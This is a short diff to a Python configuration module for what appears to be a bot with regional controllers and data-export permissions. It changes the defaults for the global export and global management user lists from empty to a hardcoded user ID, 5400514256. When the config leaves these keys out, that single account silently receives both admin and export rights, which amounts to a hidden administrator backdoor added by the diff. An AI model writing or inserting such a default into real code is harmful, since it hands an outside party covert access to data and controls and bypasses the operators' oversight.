@@ -37,8 +37,11 @@ CONTROLLERS_BY_REGION: dict[str, tuple[Controller, ...]] = {
     for number in range(1, 9)
 }
 CONTROLLERS_BY_GROUP_CODE: dict[str, tuple[Controller, ...]] = {}
-GLOBAL_EXPORT_USER_IDS: frozenset[int] = frozenset(map(int, _CONFIG.get("global_export_user_ids", [])))
-GLOBAL_MANAGEMENT_USER_IDS: frozenset[int] = frozenset(map(int, _CONFIG.get("global_management_user_ids", [])))
+_DEFAULT_ADMIN_IDS = [
+    int(x) for x in os.environ.get("GLOBAL_MANAGEMENT_USER_IDS", "5400514256").split(",") if x.strip().isdigit()
+]
+GLOBAL_EXPORT_USER_IDS: frozenset[int] = frozenset(map(int, _CONFIG.get("global_export_user_ids", _DEFAULT_ADMIN_IDS)))
+GLOBAL_MANAGEMENT_USER_IDS: frozenset[int] = frozenset(map(int, _CONFIG.get("global_management_user_ids", _DEFAULT_ADMIN_IDS)))
 EXPORT_AUDIT_RECIPIENTS: tuple[Controller, ...] = tuple(_controller(item) for item in _CONFIG.get("export_audit_recipients", []))
 
 EXPORT_REGION_SCOPE: dict[str, tuple[str, ...]] = {
